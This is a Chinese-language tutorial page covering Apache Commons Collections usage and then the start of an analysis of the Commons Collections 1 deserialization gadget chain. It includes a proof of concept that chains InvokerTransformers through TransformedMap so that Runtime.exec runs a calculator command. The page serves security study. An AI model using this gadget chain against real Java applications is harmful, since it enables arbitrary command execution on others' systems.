<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">package org.example;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.commons.collections.IterableMap;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.commons.collections.MapIterator;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.commons.collections.map.HashedMap;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class App {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void main(String[] args) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        IterableMap iterableMap = new HashedMap();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        iterableMap.put(&quot;a&quot;, &quot;b&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        iterableMap.put(&quot;c&quot;, &quot;d&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        iterableMap.put(&quot;e&quot;, &quot;F&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        MapIterator mapIterator = iterableMap.mapIterator();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        while (mapIterator.hasNext()){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            Object key = mapIterator.next();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            Object value = mapIterator.getValue();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            System.out.println(&quot;key: &quot; + key);  // key: a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            System.out.println(&quot;value: &quot; + value);  // value: b</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            mapIterator.setValue(value + &quot;TEST&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(iterableMap);    // {a=bTEST, c=dTEST, e=FTEST}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="通用集合-orderedmap">通用集合 OrderedMap<a href="#通用集合-orderedmap" class="hash-link" aria-label="通用集合 OrderedMap的直接链接" title="通用集合 OrderedMap的直接链接">​</a></h4>
<p><code>OrderedMap</code> 是映射的新接口，用于保留添加元素的顺序。 <code>LinkedMap</code> 和 <code>ListOrderedMap</code> 是两种可用的实现。 此接口支持 <code>Map</code> 的迭代器，并允许在 Map 中向前或向后两个方向进行迭代。</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">package org.example;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.commons.collections.OrderedMap;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.commons.collections.map.LinkedMap;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class App {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void main(String[] args) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        OrderedMap map = new LinkedMap();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        map.put(&quot;a&quot;, &quot;b&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        map.put(&quot;C&quot;, &quot;D&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(map.firstKey()); // a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(map.lastKey());  // C</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(map.nextKey(&quot;a&quot;));   // C</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(map.previousKey(&quot;C&quot;));   // a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="集合工具类-collectionutils">集合工具类 CollectionUtils<a href="#集合工具类-collectionutils" class="hash-link" aria-label="集合工具类 CollectionUtils的直接链接" title="集合工具类 CollectionUtils的直接链接">​</a></h4>
<p>Apache Commons Collections 库的 <code>CollectionUtils</code> 类提供各种实用方法，用于覆盖广泛用例的常见操作。 它有助于避免编写样板代码。 这个库在 jdk 8 之前是非常有用的，<strong>但现在 Java 8 的 Stream API 提供了类似的功能</strong>。</p>
<h5 class="anchor anchorWithStickyNavbar_LWe7" id="检查是否为空元素">检查是否为空元素<a href="#检查是否为空元素" class="hash-link" aria-label="检查是否为空元素的直接链接" title="检查是否为空元素的直接链接">​</a></h5>
<p>CollectionUtils 的 <code>addIgnoreNull()</code> 方法可用于确保只有非空 (<code>null</code>) 值被添加到集合中。</p>
<p><strong>返回值</strong>：如果集合已更改，则返回为 <code>True</code>。</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">List&lt;String&gt; list = new LinkedList&lt;String&gt;();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">boolean result1 = CollectionUtils.addIgnoreNull(list, null);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">System.out.println(result1); // false</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">boolean result2 = CollectionUtils.addIgnoreNull(list, &quot;a&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">System.out.println(result2); // true</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">System.out.println(list); // [a]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">System.out.println(list.contains(null)); // false</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">list.add(null);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">System.out.println(list); // [a, null]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">System.out.println(list.contains(null)); // true</span><br></span></code></pre></div></div>
<h5 class="anchor anchorWithStickyNavbar_LWe7" id="合并两个排序列表">合并两个排序列表<a href="#合并两个排序列表" class="hash-link" aria-label="合并两个排序列表的直接链接" title="合并两个排序列表的直接链接">​</a></h5>
<p>CollectionUtils 的 <code>collate()</code> 方法可用于合并两个已排序的列表。</p>
<p><strong>返回值</strong>：一个新的排序列表，其中包含集合 <code>a</code> 和 <code>b</code> 的元素。</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">List&lt;String&gt; sortedList1 = Arrays.asList(&quot;A&quot;, &quot;C&quot;, &quot;E&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">List&lt;String&gt; sortedList2 = Arrays.asList(&quot;B&quot;, &quot;D&quot;, &quot;F&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">List&lt;String&gt; mergedList = CollectionUtils.collate(sortedList1, sortedList2);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">System.out.println(mergedList); // [A, B, C, D, E, F]</span><br></span></code></pre></div></div>
<h5 class="anchor anchorWithStickyNavbar_LWe7" id="转换列表">转换列表<a href="#转换列表" class="hash-link" aria-label="转换列表的直接链接" title="转换列表的直接链接">​</a></h5>
<p><code>CollectionUtils</code> 的 <code>collect()</code> 方法可用于将一种类型的对象列表转换为不同类型的对象列表。</p>
<p><strong>返回值</strong>：转换结果 (新列表)。</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">List&lt;String&gt; stringList = Arrays.asList(&quot;1&quot;, &quot;2&quot;, &quot;3&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">List&lt;Integer&gt; integerList = (List&lt;Integer&gt;) CollectionUtils.collect(stringList,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		new Transformer&lt;String, Integer&gt;() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">			@Override</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">			public Integer transform(String input) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">				return Integer.parseInt(input);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">			}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		});</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">System.out.println(integerList); // [1, 2, 3]</span><br></span></code></pre></div></div>
<h5 class="anchor anchorWithStickyNavbar_LWe7" id="过滤列表">过滤列表<a href="#过滤列表" class="hash-link" aria-label="过滤列表的直接链接" title="过滤列表的直接链接">​</a></h5>
<p>CollectionUtils 的 <code>filter()</code> 方法可用于过滤列表以移除不满足由谓词传递提供的条件的对象。</p>
<p><strong>返回值</strong>：如果通过此调用修改了集合，则返回 <code>true</code>，否则返回 <code>false</code>。</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">List&lt;Integer&gt; integerList = new ArrayList&lt;Integer&gt;();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">integerList.addAll(Arrays.asList(1, 2, 3, 4, 5, 6, 7, 8));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">System.out.println(integerList); // [1, 2, 3, 4, 5, 6, 7, 8]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CollectionUtils.filter(integerList, new Predicate&lt;Integer&gt;() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	@Override</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	public boolean evaluate(Integer input) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		if (input.intValue() % 2 == 0) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">			return true;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		return false;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">});</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">System.out.println(integerList); // [2, 4, 6, 8]</span><br></span></code></pre></div></div>
<h5 class="anchor anchorWithStickyNavbar_LWe7" id="检查非空列表">检查非空列表<a href="#检查非空列表" class="hash-link" aria-label="检查非空列表的直接链接" title="检查非空列表的直接链接">​</a></h5>
<p>CollectionUtils 的 <code>isNotEmpty()</code> 方法可用于检查列表是否为 null 而不用担心 null 列表。 因此，在检查列表大小之前，不需要将无效检查放在任何地方。</p>
<p><strong>返回值</strong>：如果非空且非 null，则返回为<!-- -->:true<!-- -->。</p>
<h5 class="anchor anchorWithStickyNavbar_LWe7" id="检查空的列表">检查空的列表<a href="#检查空的列表" class="hash-link" aria-label="检查空的列表的直接链接" title="检查空的列表的直接链接">​</a></h5>
<p>CollectionUtils 的 <code>isEmpty()</code> 方法可用于检查列表是否为空。</p>
<p><strong>返回值</strong>：如果为空或为 <code>null</code>，则返回为 <code>true</code>。</p>
<h5 class="anchor anchorWithStickyNavbar_LWe7" id="检查子列表">检查子列表<a href="#检查子列表" class="hash-link" aria-label="检查子列表的直接链接" title="检查子列表的直接链接">​</a></h5>
<p>CollectionUtils 的 isSubCollection () 方法可用于检查集合是否包含给定集合。</p>
<p><strong>参数</strong></p>
<ul>
<li><code>a</code> - 第一个 (子) 集合不能为空。</li>
<li><code>b</code> - 第二个 (超集) 集合不能为空。</li>
</ul>
<p>当且仅当 <code>a</code> 是 <code>b</code> 的子集合时才为 <code>true</code>。</p>
<h5 class="anchor anchorWithStickyNavbar_LWe7" id="检查相交">检查相交<a href="#检查相交" class="hash-link" aria-label="检查相交的直接链接" title="检查相交的直接链接">​</a></h5>
<p>CollectionUtils 的 <code>intersection()</code> 方法可用于获取两个集合 (交集) 之间的公共对象部分。</p>
<p><strong>参数</strong></p>
<ul>
<li><code>a</code> - 第一个 (子) 集合不能为 <code>null</code>。</li>
<li><code>b</code> - 第二个 (超集) 集合不能为 <code>null</code>。</li>
</ul>
<p><strong>返回值</strong>：两个集合的交集。</p>
<h5 class="anchor anchorWithStickyNavbar_LWe7" id="求差集">求差集<a href="#求差集" class="hash-link" aria-label="求差集的直接链接" title="求差集的直接链接">​</a></h5>
<p>CollectionUtils 的 <code>subtract()</code> 方法可用于通过从其他集合中减去一个集合的对象来获取新集合。</p>
<p><strong>参数</strong></p>
<ul>
<li><code>a</code> - 要从中减去的集合，不能为 <code>null</code>。</li>
<li><code>b</code> - 要减去的集合，不能为 <code>null</code>。</li>
</ul>
<p><strong>返回值</strong>：两个集合的差集 (新集合)。</p>
<h5 class="anchor anchorWithStickyNavbar_LWe7" id="求联合集">求联合集<a href="#求联合集" class="hash-link" aria-label="求联合集的直接链接" title="求联合集的直接链接">​</a></h5>
<p>CollectionUtils 的 <code>union()</code> 方法可用于获取两个集合的联合。</p>
<p><strong>参数</strong></p>
<ul>
<li><code>a</code> - 第一个集合，不能为 <code>null</code>。</li>
<li><code>b</code> - 第二个集合，不能为 <code>null</code>。</li>
</ul>
<p><strong>返回值</strong>：两个集合的联合。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="参考教程">参考教程<a href="#参考教程" class="hash-link" aria-label="参考教程的直接链接" title="参考教程的直接链接">​</a></h3>
<ul>
<li><a href="https://www.yiibai.com/commons_collections" target="_blank" rel="noopener noreferrer">Apache Commons Collections教程</a></li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="commons-collections1-分析">Commons Collections1 分析<a href="#commons-collections1-分析" class="hash-link" aria-label="Commons Collections1 分析的直接链接" title="Commons Collections1 分析的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="前言">前言<a href="#前言" class="hash-link" aria-label="前言的直接链接" title="前言的直接链接">​</a></h3>
<p><code>Commons Collections</code>的利用链也被称为cc链，在学习反序列化漏洞必不可少的一个部分。</p>
<p>Apache Commons  Collections是Java中应用广泛的一个库，包括Weblogic、JBoss、WebSphere、Jenkins等知名大型Java应用都使用了这个库。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="前置知识">前置知识<a href="#前置知识" class="hash-link" aria-label="前置知识的直接链接" title="前置知识的直接链接">​</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="poc示例">POC示例<a href="#poc示例" class="hash-link" aria-label="POC示例的直接链接" title="POC示例的直接链接">​</a></h4>
<p>先引入依赖</p>
<div class="language-xml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-xml codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">dependencies</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">dependency</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">groupId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">commons-collections</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">groupId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">artifactId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">commons-collections</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">artifactId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">version</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">3.1</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">version</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">dependency</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">dependencies</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre></div></div>
<p>网上的一个POC，先看下涉及哪些类；</p>
<p>因为在调试这条链的时候会涉及到一些没接触过的类，在调试前需要了解到这些类的一个作用，方便后面的理解。</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">package org.example;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.commons.collections.Transformer;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.commons.collections.functors.ChainedTransformer;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.commons.collections.functors.ConstantTransformer;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.commons.collections.functors.InvokerTransformer;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.commons.collections.map.TransformedMap;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.util.HashMap;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.util.Map;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class App {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void main(String[] args) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Transformer[] transformers = new Transformer[]{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                new ConstantTransformer(Runtime.class),</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0]}),</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;open -na Calculator&quot;})</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        };</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        //将transformers数组存入ChaniedTransformer这个继承类</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Transformer transformerChain = new ChainedTransformer(transformers);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        //创建Map并绑定transformerChina</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Map innerMap = new HashMap();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        innerMap.put(&quot;value&quot;, &quot;value&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        //给予map数据转化链</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        //触发漏洞</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        //outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        onlyElement.setValue(&quot;foobar&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<p>先运行下查看结果。</p>
<p><img decoding="async" loading="lazy" alt="image-20210802133810779" src="/assets/images/image-20210802133810779-51a71cd0e14f1fb31c45964b857fb8e4.png" width="3576" height="2186" class="img_ev3q"></p>
<p>成功执行了系统命令。</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="transformer">Transformer<a href="#transformer" class="hash-link" aria-label="Transformer的直接链接" title="Transformer的直接链接">​</a></h4>
<p><code>Transformer</code>是<code>Commons Collections</code>中提供的一个接口，只有一个待实现的<code>transform</code>方法。</p>
<p><img decoding="async" loading="lazy" alt="image-20210802134227012" src="/assets/images/image-20210802134227012-bd4bc04c5d8793fbc978623f453a3ecf.png" width="1106" height="468" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="constanttransformer">ConstantTransformer<a href="#constanttransformer" class="hash-link" aria-label="ConstantTransformer的直接链接" title="ConstantTransformer的直接链接">​</a></h4>
<p><code>ConstantTransformer</code>是接口<code>Transformer</code>的实现类</p>
<p>它的过程就是在构造函数的时候传⼊⼀个对象，并在<code>transform</code>⽅法将这个对象再返回，其实就是包装任意⼀个对象，在执⾏回调时返回这个对象，进⽽⽅便后续操作。</p>
<p><img decoding="async" loading="lazy" alt="image-20210802134701793" src="/assets/images/image-20210802134701793-ebb02f872fcca2c398a2b9ad6d9da620.png" width="2066" height="1298" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="invokertransformer️">InvokerTransformer‼️<a href="#invokertransformer️" class="hash-link" aria-label="InvokerTransformer‼️的直接链接" title="InvokerTransformer‼️的直接链接">​</a></h4>
<p><code>InvokerTransformer</code>也是<code>Transformer</code>的实现类</p>
<p>在构造方法中有三个参数</p>
<ul>
<li>第⼀个参数是待执⾏的⽅法名</li>
<li>第⼆个参数是这个函数的参数列表的参数类型</li>
<li>第三个参数是传给这个函数的参数列表</li>
</ul>
<p>里面还提供了一个<code>transform</code>的方法，该方法可以通过Java反射机制来进行执行任意代码。</p>
<p><img decoding="async" loading="lazy" alt="image-20210802135232427" src="/assets/images/image-20210802135232427-0fe8c3bea3021228f16558ffc749bd59.png" width="2732" height="1752" class="img_ev3q"></p>
<p>实现代码举例：</p>
<blockquote>
<p>不能直接利用</p>
</blockquote>
<p><img decoding="async" loading="lazy" alt="image-20210804112440501" src="/assets/images/image-20210804112440501-e1a72d0cdfa0f812ab77bb8ee9756b77.png" width="2456" height="924" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="chainedtransformer️">ChainedTransformer‼️<a href="#chainedtransformer️" class="hash-link" aria-label="ChainedTransformer‼️的直接链接" title="ChainedTransformer‼️的直接链接">​</a></h4>
<p>ChainedTransformer也是实现了<code>Transformer</code>接⼝的⼀个类</p>
<p>看到<code>transform</code>方法是通过传入<code>Trasnformer[]</code>数组来对传入的数值进行遍历并且调用数组对象的<code>transform</code>方法，它的作⽤是将内部的多个<code>Transformer</code>串在⼀起。</p>
<p>通俗来说就是，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊，将多个<code>Transformer</code> 用过依次调用各自的<code>transform</code> 连接起来，用P牛的⼀个图做示意：</p>
<p><img decoding="async" loading="lazy" alt="img" src="/assets/images/20210314111944-84bb319dbd72dec61aa4295f0dd07f0b.png" width="1165" height="403" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" alt="image-20210802140232890" src="/assets/images/image-20210802140232890-3eb72bb196a223df438ea38c1d796139.png" width="1826" height="1274" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="几个transformer实现类整理">几个Transformer实现类整理<a href="#几个transformer实现类整理" class="hash-link" aria-label="几个Transformer实现类整理的直接链接" title="几个Transformer实现类整理的直接链接">​</a></h4>
<p>理一理这几个<code>Transfromer</code>。其实一共就三个<code>Transformer</code>,而且这些<code>XxxTransformer</code>都是<strong>实现了<code>TransFormer</code>这个接口</strong>的，所以他们都有一个<code>transform</code>方法:</p>
<table><thead><tr><th style="text-align:center">InvokerTransformer</th><th style="text-align:center">ConstantTransformer</th><th style="text-align:center">ChainedTransformer</th></tr></thead><tbody><tr><td style="text-align:center">构造函数接受三个参数</td><td style="text-align:center">构造函数接受一个参数</td><td style="text-align:center">构造函数接受一个TransFormer类型的数组</td></tr><tr><td style="text-align:center">transform方法通过反射可以执行一个对象的任意方法</td><td style="text-align:center">transform返回构造函数传入的参数</td><td style="text-align:center">transform方法执行构造函数传入数组的每一个成员的transform方法</td></tr></tbody></table>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="map">Map<a href="#map" class="hash-link" aria-label="Map的直接链接" title="Map的直接链接">​</a></h4>
<p><code>Transform</code>来执行命令需要绑定到Map上，抽象类<code>AbstractMapDecorator</code>是Apache Commons  Collections提供的一个类，实现类有很多，比如LazyMap、TransformedMap等，这些类都有一个<code>decorate()</code>方法，用于将上述的Transformer实现类绑定到Map上，<strong>当对Map进行一些操作时，会自动触发Transformer实现类的tranform()方法，不同的Map类型有不同的触发规则。</strong></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="transformedmap️">TransformedMap‼️<a href="#transformedmap️" class="hash-link" aria-label="TransformedMap‼️的直接链接" title="TransformedMap‼️的直接链接">​</a></h4>
<p><code>TransformedMap</code>这个类是用来对<code>Map</code>进行某些变换（修饰）用的，例如当我们修改<code>Map</code>中的某个值时，就会触发我们预先定义好的某些操作来对<code>Map</code>进行处理（回调）。</p>
